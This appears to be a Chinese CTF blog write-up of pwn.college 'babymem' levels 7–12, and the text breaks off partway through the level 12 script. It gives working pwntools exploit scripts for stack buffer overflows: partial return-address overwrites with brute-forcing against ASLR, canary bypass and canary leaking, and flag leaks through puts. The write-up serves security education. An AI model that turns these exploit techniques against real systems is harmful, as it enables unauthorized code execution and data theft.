7</h2><p>这一关，程序的加载基址是随机的，无法通过固定的地址跳转。但是页的大小是<code>0x1000</code>，这意味着最后三个十六进制的地址是固定的，可以通过覆盖返回地址的最后两个字节来实现跳转，至于第4个二进制数，只能靠多次运行猜测了。</p><p>这里要说一下，这个recv最多是一次性接受<code>nums</code>个字节，有一个上限，如果你不确定回显是否在这个范围内的话，最好还是用recvall，这个可以获取到所有的输出，直到<code>EOF</code>，但是它接受完之后，就会关闭<code>tube</code>。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">+---------------------------------+-------------------------+--------------------+|                  Stack location |            Data (bytes) |      Data (LE int) |+---------------------------------+-------------------------+--------------------+| 0x00007ffc02d5d290 (rsp+0x0000) | a0 d2 d5 02 fc 7f 00 00 | 0x00007ffc02d5d2a0 || 0x00007ffc02d5d298 (rsp+0x0008) | 88 e4 d5 02 fc 7f 00 00 | 0x00007ffc02d5e488 || 0x00007ffc02d5d2a0 (rsp+0x0010) | 78 e4 d5 02 fc 7f 00 00 | 0x00007ffc02d5e478 || 0x00007ffc02d5d2a8 (rsp+0x0018) | 00 3a ab 52 01 00 00 00 | 0x0000000152ab3a00 || 0x00007ffc02d5d2b0 (rsp+0x0020) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 || 0x00007ffc02d5d2b8 (rsp+0x0028) | 9a 00 00 00 00 00 00 00 | 0x000000000000009a || 0x00007ffc02d5d2c0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d2c8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d2d0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d2d8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d2e0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d2e8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d2f0 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d2f8 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d300 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d308 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d310 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d318 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d320 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d328 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d330 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d338 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d340 (rsp+0x00b0) | 41 41 41 41 9a 00 00 00 | 0x0000009a41414141 || 0x00007ffc02d5d348 (rsp+0x00b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d350 (rsp+0x00c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 || 0x00007ffc02d5d358 (rsp+0x00c8) | 99 3e e5 1f 75 55 00 00 | 0x000055751fe53e99 |+---------------------------------+-------------------------+--------------------+The program&#39;s memory status:- the input buffer starts at 0x4141414141414141- the saved frame pointer (of main) is at 0x7ffc02d5d350- the saved return address (previously to main) is at 0x7ffc02d5d358- the saved return address is now pointing to 0x55751fe53e99.- the address of win_authed() is 0x55751fe53e71.   &lt;---- 这个3e71的3是会变化的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level7.0"</span><span class="token punctuation">)</span> p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level7.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"154"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">152</span>payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token string">b'\x99\x3E'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level7.0"</span><span class="token punctuation">)</span>     p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level7.0"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"154"</span><span class="token punctuation">)</span>    buffer_size <span class="token operator">=</span> <span class="token number">152</span>    payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token string">b'\x99\x1E'</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level7.1"</span><span class="token punctuation">)</span>     p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level7.1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"90"</span><span class="token punctuation">)</span>    buffer_size <span class="token operator">=</span> <span class="token number">88</span>    payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> <span class="token string">b'\xAE\x22'</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>此关跟上level 7一致，多了一句strlen()判断字符串长度，我们直接将填充字节换成00这样，strlen的返回长度就是0。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level8.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level8.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"74"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">72</span>payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x95\x19'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>这道题开启了栈保护，但我们能控制缓冲区溢出时写入的位置，只要我们跳过栈保护的随机值，直接覆盖返回地址，就不会出发栈保护。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0000000000002684 B8 00 00 00 00                mov     eax, 0.text:0000000000002689 48 8B 4D F8                   mov     rcx, [rbp+var_8] # var_8存储的是栈基址.text:000000000000268D 64 48 33 0C 25 28 00 00 00    xor     rcx, fs:28h.text:0000000000002696 74 05                         jz      short locret_269D.text:0000000000002696.text:0000000000002698 E8 C3 EA FF FF                call    ___stack_chk_failbuffsize00 00 00 00 n 00 00 00变量1金丝雀随机值rbpreturn返回地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个需要注意的问题，就是发送的字节数。因为在循环的结束是小于之前输入的<code>v4</code>，所以你必须确保在覆盖掉返回地址的两个字节后，循环就要终止。所以向程序发送的<code>v4</code>，是<code> buffer 距离 return 的字节数 + 2</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">printf<span class="token punctuation">(</span><span class="token string">"Send your payload (up to %lu bytes)!\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v6 <span class="token operator">&lt;</span> v4 <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    v0 <span class="token operator">=</span> read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> <span class="token operator">*</span>v6<span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>v6 <span class="token operator">+=</span> v0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level9.1"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level9.1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"58"</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Send your payload (up to 58 bytes)!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment"># 24 为buffer_size  2是覆盖的返回值字节数, 1是n变量</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"send </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">th bytes"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\x37'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">26</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\x1A'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">25</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\x76'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\xBB'</span><span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level9.0"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level9.0"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"90"</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Send your payload (up to 90 bytes)!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>    i <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">64</span>  <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># 64 为buffer_size , 4是n变量前面的空字节数, 2是覆盖的返回值字节数, 1是n变量</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">64</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\x57'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">70</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\x1c'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">69</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\x62'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\xBB'</span><span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这一关，程序将<code>flag</code>文件的内容读取到了内存中，而且最后有<code>puts()</code>函数负责打印<code>buf</code>缓冲区中的内容，所以我们只需要填充flag具体内容之前的部分为<code>A</code>即可。注意不要发送<code>\x00</code>，这样<code>puts()</code>打印时，会将之前存储在<code>buf</code>中的<code>flag</code>一起打印出来。</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">-0x180 ---&gt; &amp;buffer-0x188 ---&gt; &amp;flag-0x180 ---&gt; buf   输入的字符串-0x180 + 0x6B --&gt; flag的具体内容0x000 ----&gt; 旧的rbp指针  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level10.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level10.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"107"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">107</span>payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">b'A'</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>这一关跟上一关一样。唯一不同的是，之前缓冲区是在栈空间上的，现在使用<code>mmap</code>(Memory Mapped File)将文件内容映射到进程的地址空间，从而可以像访问内存一样访问文件内容。通过这种方式，可以非常高效地对文件进行操作，特别适用于需要频繁读写大文件的场景。<code>mmap</code> 创建的内存映射区域可以被多个进程共享，所以当一个进程修改了映射区域的内容，其他进程可以立即看到这些修改。</p><p>当一个进程多次调用<code>mmap</code>来创建内存映射区域时，每次调用都会在进程的虚拟地址空间中分配一个新的内存区域，并返回这个区域的起始地址。如果这些内存区域不被解除映射 <code>(munmap)</code>，它们将一直存在于进程的地址空间中，直到进程结束。</p><p>另外，如果你要求的大小小于0x1000(4096)，通常，mmap 分配的地址会满足页面对齐要求（例如，4KB 页对齐）。所以它可能还是会分配0x1000的大小。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>   v7 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> buf <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x11uLL</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这里buf的大小还是0x1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">Called mmap(0, 0x1000, 4, MAP_SHARED, open(&quot;&#x2F;flag&quot;, 0), 0) &#x3D; 0x7f795e195000Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e194000Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e193000Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e192000Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e191000Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e190000Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e18f000Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e18e000Memory mapping the input buffer...Called mmap(0, 82, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) &#x3D; 0x7f795e18d000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以只需要把payload设置成0x1000*8就行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level11.0"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level11.0"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">8</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>payload <span class="token operator">=</span> buffer_size <span class="token operator">*</span> <span class="token string">"A"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>这一关开启canary保护，不能直接通过缓冲区溢出复写返回地址，因为这样一定会覆盖掉canary的校验值，导致程序后续运行失败。</p><p>但是通过反编译以后发现，存在<code>challenge</code>的重复调用，这就意味着，我们可以通过第一次challenge的调用后<code>puts()</code>打印的回显，获取canary的值。然后在第二次调用中，复写函数的返回地址。这样，在知道<code>cannary</code>值的前提下， 不会触发段溢出的报错。还是跟之前一样，因为不是position independent，所以只复写两个字节，然后重试。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">,</span> <span class="token string">"REPEAT"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Backdoor triggered! Repeating challenge()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">challenge</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level12.1"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/babymem_level12.1"</span><span class="token punctuation">)</span>buffer_size <span class="token operator">=</span> <span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">1</span>                      <span class="token comment"># 1 是为了填补canary最低位的0x00</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>buffer_size<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'REPEAT'</span> <span class="token operator">+</span>  <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x68</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 6 是REPEAT所占的字节数</span>output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'^(You said: REPEATA+.*?)$'</span><span class="token punctuation">,</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>MULTILINE<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    cancary <span class="token operator">=</span>  line<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token punctuation">:</span> <span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">]</span>    hex_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> cancary<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token 